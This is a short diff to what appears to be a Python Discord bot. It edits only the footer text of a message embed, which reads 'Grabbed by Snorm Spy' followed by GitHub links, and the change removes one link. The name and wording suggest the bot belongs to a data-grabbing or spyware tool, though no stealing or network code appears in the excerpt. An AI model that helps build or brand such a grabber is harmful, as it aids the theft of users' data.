@@ -302,7 +302,7 @@ async def on_ready():
                         "url": "https://github.com/UnsillyHaxor",  
                         "color": 16711680,  
                         "footer": {
-                            "text": "Grabbed by Snorm Spy | https://github.com/UnsillyHaxor | https://github.com/S-illy"  
+                            "text": "Grabbed by Snorm Spy | https://github.com/UnsillyHaxor | "  
                         },
                         "thumbnail": {
                             "url": image_url  
